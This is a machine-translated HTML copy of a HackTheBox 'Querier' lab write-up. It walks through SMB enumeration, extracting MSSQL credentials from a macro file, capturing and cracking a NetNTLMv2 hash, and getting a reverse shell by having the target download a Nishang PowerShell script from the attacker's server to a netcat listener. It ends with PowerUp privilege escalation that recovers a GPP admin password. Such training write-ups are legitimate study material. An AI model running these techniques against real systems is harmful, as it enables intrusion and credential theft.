<html>
<head>
<title>HacktheBox — Querier Write Up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HacktheBox—query er向上写</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hackthebox-querier-write-up-1766453dbf76?source=collection_archive---------0-----------------------#2019-06-22">https://infosecwriteups.com/hackthebox-querier-write-up-1766453dbf76?source=collection_archive---------0-----------------------#2019-06-22</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="82c1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一篇关于我如何解决来自HacktheBox的box Querier的文章。</p><p id="3a7c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="http://hackthebox.eu" rel="noopener ugc nofollow" target="_blank"> Hack the Box </a>是一个在线平台，你可以在这里练习渗透测试技能。</p><p id="edb4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如我一直做的那样，我试图解释我是如何从机器上理解这里的概念的，因为我想真正理解事物是如何工作的。所以请，如果我误解了一个概念，请让我知道。非常欢迎您的指正。:D</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi km"><img src="../Images/9cc02f0a2386a57d023fb7162a8b7ef6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1192/format:webp/1*Cihy-he5XiMfhskWlJasNg.png"/></div></figure><h1 id="2cc4" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated"><strong class="ak">关于盒子</strong></h1><p id="032d" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">我在使用机器的过程中遇到了(并学到了)一些概念和工具。这里使用的技术利用了Windows的工作方式。我觉得在我解决了这台机器之后，我提高了对Windows工作原理的理解。这个盒子也教我们拓宽我们的工具包，因为我们的默认工具可能并不总是有效。</p><h1 id="0517" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">#TLDR</h1><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="e065" class="mc kv iq ly b gy md me l mf mg"><strong class="ly ir">Initial foothold:</strong> MSSQL creds obtained from a .bin file inside a .xlsm file, which was found during SMB enumeration. The unprivileged creds allows you to login to MSSQL to find out you can't run xp_cmdshell command, and the need to find another user is required.<br/><strong class="ly ir">User:</strong> NetNTLMv2 hash obtained thru Responder. Cracking the hash thru hashcat, gives us creds to authenticate with MSSQL, allowing us to run xp_cmdshell, then reading user.txt<br/><strong class="ly ir">Root:</strong> Running a enumeration script to identify creds stored in Groups.xml, allowing us to run wmiexec.py to retrieve root.txt</span></pre><h1 id="ba0e" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated">#最初的立足点</h1><p id="bded" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">我首先通过调用命令运行初始nmap扫描，将其保存到我们的nmap目录:</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="de15" class="mc kv iq ly b gy md me l mf mg">nmap -sV -sC oA nmap/initial 10.10.10.125</span></pre><p id="0ef2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出是:</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="66e2" class="mc kv iq ly b gy md me l mf mg"># Nmap 7.70 scan initiated Fri Apr  5 03:46:04 2019 as: nmap -sV -sC -oA nmap/initial 10.10.10.125<br/>Nmap scan report for 10.10.10.125<br/>Host is up (0.30s latency).<br/>Not shown: 996 closed ports<br/>PORT     STATE SERVICE       VERSION<br/>135/tcp  open  msrpc         Microsoft Windows RPC<br/>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br/>445/tcp  open  microsoft-ds?<br/>1433/tcp open  ms-sql-s      Microsoft SQL Server  14.00.1000.00<br/>| ms-sql-ntlm-info: <br/>|   Target_Name: HTB<br/>|   NetBIOS_Domain_Name: HTB<br/>|   NetBIOS_Computer_Name: QUERIER<br/>|   DNS_Domain_Name: HTB.LOCAL<br/>|   DNS_Computer_Name: QUERIER.HTB.LOCAL<br/>|   DNS_Tree_Name: HTB.LOCAL<br/>|_  Product_Version: 10.0.17763<br/>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br/>| Not valid before: 2019-04-05T00:39:17<br/>|_Not valid after:  2049-04-05T00:39:17<br/>|_ssl-date: 2019-04-05T02:47:10+00:00; -1h00m00s from scanner time.<br/>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><span id="5082" class="mc kv iq ly b gy mh me l mf mg">Host script results:<br/>|_clock-skew: mean: -1h00m00s, deviation: 0s, median: -1h00m01s<br/>| ms-sql-info: <br/>|   10.10.10.125:1433: <br/>|     Version: <br/>|       name: Microsoft SQL Server <br/>|       number: 14.00.1000.00<br/>|       Product: Microsoft SQL Server <br/>|_    TCP port: 1433<br/>| smb2-security-mode: <br/>|   2.02: <br/>|_    Message signing enabled but not required<br/>| smb2-time: <br/>|   date: 2019-04-05 02:47:12<br/>|_  start_date: N/A</span><span id="df71" class="mc kv iq ly b gy mh me l mf mg">Service detection performed. Please report any incorrect results at <a class="ae kl" href="https://nmap.org/submit/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/submit/</a> .<br/># Nmap done at Fri Apr  5 03:47:20 2019 -- 1 IP address (1 host up) scanned in 76.72 seconds</span></pre><p id="e9fa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因为我看到SMB端口打开(139和445)，所以我尝试枚举。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mi"><img src="../Images/adb85d307799726a0853a47d9ad2d3b1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*igQg3XadMfjDRbTBA_peJQ.png"/></div></div></figure><p id="8f1c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好像smbmap不行，但是smbclient可以。我尝试访问报告共享。我调用命令:</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="f98a" class="mc kv iq ly b gy md me l mf mg">smbclient \\\\10.10.10.125\\Reports</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mn"><img src="../Images/646278df4ad26d0bd84e469c4b1da957.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HoxHMz6CwsOVM-8ZT1iXRA.png"/></div></div></figure><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="fda8" class="mc kv iq ly b gy md me l mf mg">smb: \&gt; get “Currency Volume Report.xlsm”<br/>getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (10.1 KiloBytes/sec) (average 10.1 KiloBytes/sec) <br/>smb: \&gt;</span></pre><p id="85e0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下载文件后，我运行字符串做初步调查。</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="8222" class="mc kv iq ly b gy md me l mf mg">strings Currency\ Volume\ Report.xlsm | less</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mo"><img src="../Images/622f79a47d8bdd3cfac5745428abc171.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UC_NwV85xTfObEfTPNMgNA.png"/></div></div></figure><p id="be37" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看到有有趣的文件，我运行binwalk解压文件。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mp"><img src="../Images/546a3f2751af34151a43651642022a90.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DYk4kjGsjGjgk2Um3jKjFQ.png"/></div></div></figure><p id="61e7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我通过调用命令，尝试通过文件名查看任何感兴趣的文件</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="0be3" class="mc kv iq ly b gy md me l mf mg">find . -type f -exec ls {} \;</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mq"><img src="../Images/cd726db6314fd9cd3af273038ee13209.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hmsVP54x-uEovUYpzeXAXA.png"/></div></div></figure><p id="1684" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">调查这些文件时，我在vbaProject.bin文件中看到了creds</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi mr"><img src="../Images/d4f8c7be4426d7a606c64fd9ec29bf39.png" data-original-src="https://miro.medium.com/v2/resize:fit:1124/format:webp/1*vtwAC2Bxhj3bzwW0L0dSJQ.png"/></div></figure><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="b206" class="mc kv iq ly b gy md me l mf mg"><strong class="ly ir">Uid=reporting;Pwd=PcwTWTHRwryjc$c6</strong></span></pre><p id="de6f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我搜索如何与MSSQL接口，并从Impacket集合中找到了这个工具。我首先找到mssql客户端所在的位置，然后尝试使用找到的凭证进行身份验证。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ms"><img src="../Images/d4f4df7f07f15a80c21d4b3c4d1956f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qCdrMb7nE-P7UvXiJVHqSw.png"/></div></div></figure><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="20b7" class="mc kv iq ly b gy md me l mf mg">➜  writeup /opt/impacket/examples/mssqlclient.py QUERIER/reporting:PcwTWTHRwryjc\$c6@10.10.10.125              <br/>Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><span id="212a" class="mc kv iq ly b gy mh me l mf mg">[*] Encryption required, switching to TLS<br/>[-] ERROR(QUERIER): Line 1: Login failed for user 'reporting'.</span></pre><p id="d9be" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">请注意，即使我提供了正确的语法，我也无法登录。这是因为密码中的$字符被区别对待，不作为命令的一部分，因此会破坏它。我通过在$字符前插入一个\(反斜杠)来添加一个转义字符。我们使用-windows-auth，因为我们要对windows机器进行身份验证，默认情况下，这在mssqlclient.py中设置为FALSE</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi mt"><img src="../Images/01f2b74376ede1b8f973b6e0fef36879.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*00yEEmHYXNBUcIyFGqWXuA.png"/></div></div></figure><p id="339b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以使用enable_xp_cmdshell来运行命令，但是不允许这样做。</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="f1ca" class="mc kv iq ly b gy md me l mf mg">SQL&gt; enable_xp_cmdshell<br/>[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.<br/>[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.<br/>[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.<br/>[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.<br/>SQL&gt;</span></pre><p id="9051" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这意味着我们需要在MSSQL服务器中使用更有特权的用户进行身份验证。从这一点上我被踩了一脚，在寻求帮助后，他们给我指了ippsec的令人眩晕的<a class="ae kl" href="https://www.youtube.com/watch?v=J2unwbMQvUo&amp;t=14s" rel="noopener ugc nofollow" target="_blank">视频</a>。</p><h1 id="ed99" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated"><strong class="ak">获取用户</strong></h1><p id="b360" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">基本上，我们需要做的是告诉框列出所有的目录和文件的地址，我们给它(我们的IP/anyfile)你给它。这就是<strong class="jp ir"> xp_dirtree </strong>所做的事情。然后每当一台Windows机器连接到一个<a class="ae kl" href="https://www.lifewire.com/unc-universal-naming-convention-818230" rel="noopener ugc nofollow" target="_blank"> UNC </a>(通用命名约定)时，它就进行认证，我们使用Responder来捕获认证。在这里阅读更多关于这种技术的内容:</p><div class="mu mv gp gr mw mx"><a href="https://www.redsiege.com/blog/2018/09/capturing-sql-server-user-hash-with-sqli/" rel="noopener  ugc nofollow" target="_blank"><div class="my ab fo"><div class="mz ab na cl cj nb"><h2 class="bd ir gy z fp nc fr fs nd fu fw ip bi translated">使用SQLi捕获SQL Server用户哈希</h2><div class="ne l"><h3 class="bd b gy z fp nc fr fs nd fu fw dk translated">Red Siege是一家专注于现实世界威胁的信息安全公司。红色围城是一个信息安全…</h3></div><div class="nf l"><p class="bd b dl z fp nc fr fs nd fu fw dk translated">www.redsiege.com</p></div></div><div class="ng l"><div class="nh l ni nj nk ng nl ks mx"/></div></div></a></div><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nm"><img src="../Images/5031465adee781ae6dda9e8790dcdcec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Hi8glQ5nMhsLxoz4e3KXKw.png"/></div></div><figcaption class="nn no gj gh gi np nq bd b be z dk translated">顶部窗格使用xp_cmdshell与我们认证，左下窗格是我的笔记，右下是响应者捕获散列。</figcaption></figure><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="006c" class="mc kv iq ly b gy md me l mf mg">mssql-svc::QUERIER:85c1999c701c121f:BD5F34615155A99A8007702911B40812:0101000000000000C0653150DE09D201A374F92445851A60000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000000000000030000013B6D9E75400317DED27B783C540A7F4EC9E84FCDE59320A2863F40D26DD95280A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310032002E00310033003700000000000000000000000000</span></pre><p id="cd6a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，我们捕获的哈希是一个NetNTLMv2。那么你能用它做什么呢？您可以在此阅读不同的Windows哈希:</p><p id="4bee" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><a class="ae kl" href="https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4" rel="noopener">https://medium . com/@ Peter gombos/lm-NTLM-net-NTLM v2-oh-my-a9 b 235 c 58 ed 4</a></p><p id="4ff6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在使用Hashcat破解捕获的散列。我在我的虚拟机外部使用以下命令破解了这个问题:</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="3468" class="mc kv iq ly b gy md me l mf mg">hashcat64.exe -a 0 -m 5600 htb-querier\ntlmv2.hashes ../rockyou.txt</span></pre><p id="0104" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">密码是:</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="2b6b" class="mc kv iq ly b gy md me l mf mg">MSSQL-SVC::QUERIER:9b898326b9186201:fd7fafcc958063e0d5ec08ac8aaf6296:0101000000000000c0653150de09d20188780e6bd3843d6f000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d2010600040002000000080030003000000000000000000000000030000053249e465673e700bfa206e131445974681e66f06fcb5cfac1a59591c8e8f77d0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310032002e0033003800000000000000000000000000:<strong class="ly ir">corporate568</strong></span></pre><p id="1033" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用凭证进行认证</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="4069" class="mc kv iq ly b gy md me l mf mg">mssqlclient.py QUERIER/mssql-svc:corporate568@10.10.10.125 -windows-auth</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nr"><img src="../Images/3fbf77647cfd1306adb7d137749ffd50.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QAXKd2xhijAFFKL1h6KyPQ.png"/></div></div></figure><p id="1d1f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在可以读取user.txt</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ns"><img src="../Images/4d6a54332b5c8d81c627bc90b360974e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CVaPZiC79zm48RV2mpR2MA.png"/></div></div></figure><h1 id="ad4c" class="ku kv iq bd kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr bi translated"><strong class="ak">获取根:</strong></h1><p id="a5ba" class="pw-post-body-paragraph jn jo iq jp b jq ls js jt ju lt jw jx jy lu ka kb kc lv ke kf kg lw ki kj kk ij bi translated">我决定先买一个shell，因为用它导航更容易。我用的是<a class="ae kl" href="https://github.com/samratashok/nishang/tree/master/Shells" rel="noopener ugc nofollow" target="_blank">霓裳</a>的TcpOneLiner(别忘了编辑文件，改成你的IP)。</p><p id="4c98" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们需要在Querier box上从Nishang获取我们的TCP客户端。你可以用很多方法做到这一点。我只是告诉它从我的机器上下载。</p><p id="312d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">要获得我们的shell，我们不会使用Netcat，因为它可能不在盒子里(虽然没有检查)，并且它很容易在Windows机器中被标记。所以我用的是PowerShell，从Windows 7开始内置在Windows中。我们可以通过以下步骤做到这一点:</p><p id="22f1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">设置我们的http服务器(默认为端口8000):</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="775a" class="mc kv iq ly b gy md me l mf mg">➜  Querier python3 -m http.server<br/>Serving HTTP on 0.0.0.0 port 8000 (<a class="ae kl" href="http://0.0.0.0:8000/" rel="noopener ugc nofollow" target="_blank">http://0.0.0.0:8000/</a>) ...</span></pre><p id="ac34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">告诉机器下载我们的脚本(找到一个可以写入的目录):</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nt"><img src="../Images/5547374f6d75e503175005ffceeb6efa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*r5CM3xO84vIdcYlvYB_uig.png"/></div></div></figure><p id="1935" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们在Netcat上设置我们的监听器(是的，它可以工作，即使您的客户端不是Netcat):</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="62ba" class="mc kv iq ly b gy md me l mf mg">nc -nlvp 9001</span></pre><p id="79e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后通过调用以下命令来执行客户端:</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="aa3e" class="mc kv iq ly b gy md me l mf mg">xp_cmdshell powershell -noexit "&amp; ""c:\users\mssql-svc\downloads\try.ps1"""</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nu"><img src="../Images/1b3624ab5978ac18b5b6e110653e637a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GEx4fM_BKDZ4eIoYlazIqA.png"/></div></div></figure><p id="fc39" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我试图列出管理员的文件，希望我可以，但失败了。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nv"><img src="../Images/895a3bd36564f727d569d2890104ca09.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JzwpZa_pDac17OluFFA-nQ.png"/></div></div></figure><p id="5e87" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在寻找Windows机器中的特权方法后，HarmJ0y的<a class="ae kl" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc" rel="noopener ugc nofollow" target="_blank"> PowerUp </a>脚本就是答案。PowerUp旨在成为基于错误配置的常见Windows权限提升途径的信息交换所。</p><p id="7485" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们首先在机器上获得PowerUp.ps1脚本。我所做的和我把rev shell客户端放在机器上的过程是一样的。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nw"><img src="../Images/1353977166676c4f4f01cf336fd67dc6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*73ml2DeuS04hHSZzmD3vRA.png"/></div></div></figure><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi nx"><img src="../Images/34f83c028a885705493afe0a17779769.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pKuiSLP3KDRvJThqO2Z11g.png"/></div></div></figure><p id="a4ae" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">关于如何在目标机器上运行它，有一些选项。以下是一些参考:</p><div class="mu mv gp gr mw mx"><a href="https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/" rel="noopener  ugc nofollow" target="_blank"><div class="my ab fo"><div class="mz ab na cl cj nb"><h2 class="bd ir gy z fp nc fr fs nd fu fw ip bi translated">通电:使用指南</h2><div class="ne l"><h3 class="bd b gy z fp nc fr fs nd fu fw dk translated">注意:这个主题是在Veris Group的官方博客上交叉发布的。加电是想要一个干净的方法的结果…</h3></div><div class="nf l"><p class="bd b dl z fp nc fr fs nd fu fw dk translated">www.harmj0y.net</p></div></div><div class="ng l"><div class="ny l ni nj nk ng nl ks mx"/></div></div></a></div><figure class="kn ko kp kq gt kr"><div class="bz fp l di"><div class="nz oa l"/></div></figure><p id="9bb1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我运行Invoke-AllChecks，看到它列出了Groups.xml中的一个错误配置。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi ob"><img src="../Images/9844e0ff0b7b5ac546ae7ae49430ccce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Lkpo-DhhxD2Vhd-UqMxRnQ.png"/></div></div></figure><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="7079" class="mc kv iq ly b gy md me l mf mg">Changed   : {2019-01-28 23:12:48}<br/>UserNames : {Administrator}<br/>NewName   : [BLANK]<br/>Passwords : {MyUnclesAreMarioAndLuigi!!1!}<br/>File      : C:\ProgramData\Microsoft\Group<br/>            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml<br/>Check     : Cached GPP Files</span></pre><p id="a3b5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以我们的管理信条是:</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="e39c" class="mc kv iq ly b gy md me l mf mg"><strong class="ly ir">Administrator:MyUnclesAreMarioAndLuigi!!1!</strong></span></pre><p id="6ce5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我使用管理员凭证进行身份验证</p><pre class="kn ko kp kq gt lx ly lz ma aw mb bi"><span id="ee73" class="mc kv iq ly b gy md me l mf mg">➜  Querier /opt/impacket/examples/mssqlclient.py QUERIER/Administrator@10.10.10.125 -windows-auth                                                                                            <br/>Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><span id="e5a6" class="mc kv iq ly b gy mh me l mf mg">Password:<br/>[*] Encryption required, switching to TLS<br/>[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master<br/>[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english<br/>[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192<br/>[*] INFO(QUERIER): Line 1: Changed database context to 'master'.<br/>[*] INFO(QUERIER): Line 1: Changed language setting to us_english.<br/>[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) <br/>[!] Press help for extra shell commands<br/>SQL&gt; help</span><span id="0db6" class="mc kv iq ly b gy mh me l mf mg">lcd {path}                 - changes the current local directory to {path}<br/>     exit                       - terminates the server process (and this session)<br/>     enable_xp_cmdshell         - you know what it means<br/>     disable_xp_cmdshell        - you know what it means<br/>     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell<br/>     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)<br/>     ! {cmd}                    - executes a local shell cmd<br/>     <br/>SQL&gt; enable_xp_cmdshell<br/>[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.<br/>[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.<br/>SQL&gt; RECONFIGURE<br/>SQL&gt; xp_cmdshell echo %username%<br/>output                                                                             <br/>--------------------------------------------------------------------------------   <br/>mssql-svc                                                                          <br/>NULL</span></pre><p id="443b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是当我们检查用户名时，我们是<strong class="jp ir"> mssql-svc </strong>，而不是<strong class="jp ir">管理员</strong>。这意味着我们需要以另一种方式使用我们的信用。这将是相当容易的，因为我们的信用是管理员帐户。</p><p id="709d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我脑子里想的是psexec和runas，这两个我都试过了，但都没用。</p><p id="1517" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我尝试了Impacket工具包中的wmiexec。您可以将此作为参考:</p><div class="mu mv gp gr mw mx"><a href="https://www.trustedsec.com/2015/06/no_psexec_needed/" rel="noopener  ugc nofollow" target="_blank"><div class="my ab fo"><div class="mz ab na cl cj nb"><h2 class="bd ir gy z fp nc fr fs nd fu fw ip bi 